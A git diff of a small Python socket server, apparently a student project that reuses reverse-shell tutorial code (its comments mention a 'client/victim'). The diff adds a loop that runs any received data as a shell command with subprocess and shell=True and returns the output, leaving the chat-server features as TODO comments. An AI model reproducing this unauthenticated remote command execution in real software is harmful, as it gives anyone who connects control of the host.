@@ -1,5 +1,7 @@
 import socket
 import sys
+import os
+import subprocess
 
 
 # Create a Socket ( connect two computers)
@@ -36,22 +38,37 @@ def bind_socket():
 def socket_accept():
     conn, address = s.accept()
     print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
-    send_commands(conn)
+    receive_commands(conn)
     conn.close()
 
 # Send commands to client/victim or a friend
-def send_commands(conn):
+def receive_commands(conn):
     # TODO: Edit this so that user can create account, and the other stuff.
     while True:
-        cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024),"utf-8")
-            print(client_response, end="")
+        data = s.recv(1024)
+
+        # allow client to 1. create an account and supply a unique user name
+
+        # allow client to list accounts by text wildcard
+
+        # allow client to send a message to a recipient, and queue if the recipient isn't logged in
+
+        # server delivers undelivered messages to a particular user if they logged in
+
+        # allow client to delete an account
+
+        # make sure there isn't cd
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[3:].decode("utf-8"))
+
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte,"utf-8")
+            currentWD = os.getcwd() + "> "
+            s.send(str.encode(output_str + currentWD))
+
+            print(output_str)
 
 
 def main():
